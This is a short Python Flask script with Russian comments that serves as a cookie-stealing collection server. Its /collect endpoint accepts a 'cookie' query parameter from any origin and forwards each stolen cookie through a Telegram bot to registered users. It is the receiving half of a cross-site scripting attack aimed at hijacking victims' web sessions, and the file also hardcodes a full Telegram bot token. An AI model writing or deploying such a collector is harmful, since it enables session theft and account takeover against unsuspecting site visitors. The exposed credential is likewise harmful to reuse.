from flask import Flask, request
import telebot
import time

app = Flask(__name__)

TOKEN = '8684971280:AAH0V29u4vT382wAv28eGr2Bo2OXMi79ERI'
bot = telebot.TeleBot(TOKEN)

# === ПРИМИТИВНАЯ БАЗА В ПАМЯТИ (для теста) ===
users = set()
cookies = []

# === КОРС-ЗАГОЛОВКИ ===
@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return response

@app.route('/')
def index():
    return '✅ Бот работает! Вебхук активен.'

@app.route('/collect')
def collect():
    cookie = request.args.get('cookie')
    if cookie:
        cookies.append(cookie)
        print(f'📩 Получена кука: {cookie[:50]}...')
        # Отправляем всем зарегистрированным пользователям
        for user_id in list(users):
            try:
                bot.send_message(user_id, f'🍪 Новая кука: {cookie}')
                time.sleep(0.1)
            except Exception as e:
                print(f'Ошибка отправки пользователю {user_id}: {e}')
        return 'OK', 200
    return 'No cookie', 400

@app.route('/register/<int:user_id>')
def register(user_id):
    users.add(user_id)
    return 'Registered'

@app.route('/users')
def users_list():
    return str(list(users))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
